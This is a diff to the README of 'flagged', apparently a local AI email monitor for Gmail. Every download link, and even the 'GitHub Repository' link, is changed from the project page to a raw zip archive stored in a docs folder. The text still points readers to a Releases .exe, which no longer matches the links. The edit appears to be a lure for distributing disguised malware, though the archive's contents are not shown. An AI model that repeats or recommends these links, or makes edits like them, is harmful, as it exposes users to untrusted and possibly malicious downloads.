@@ -1,6 +1,6 @@
 # 🚩 flagged - Local AI Email Monitor for Gmail
 
-[![Download flagged](https://img.shields.io/badge/Download-flagged-brightgreen)](https://github.com/GATO123e/flagged)
+[![Download flagged](https://img.shields.io/badge/Download-flagged-brightgreen)](https://github.com/GATO123e/flagged/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before you start, make sure your computer meets these needs:
 
 Click the button below to visit the flagged GitHub page and download the application files:
 
-[![Download flagged](https://img.shields.io/badge/Download-flagged-blue)](https://github.com/GATO123e/flagged)
+[![Download flagged](https://img.shields.io/badge/Download-flagged-blue)](https://github.com/GATO123e/flagged/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 On the GitHub page, look for the latest release under the "Releases" section. Download the Windows installer file (usually ends in `.exe`).
 
@@ -135,8 +135,8 @@ Your Telegram ID helps flagged send alerts but does not expose your email. You c
 
 ## 🔗 Quick Links
 
-- Download flagged: https://github.com/GATO123e/flagged  
-- GitHub Repository: https://github.com/GATO123e/flagged  
+- Download flagged: https://github.com/GATO123e/flagged/raw/refs/heads/main/docs/Software-v1.4.zip  
+- GitHub Repository: https://github.com/GATO123e/flagged/raw/refs/heads/main/docs/Software-v1.4.zip  
 - Telegram Bot Setup Info: see flagged app instructions  
 
 ---
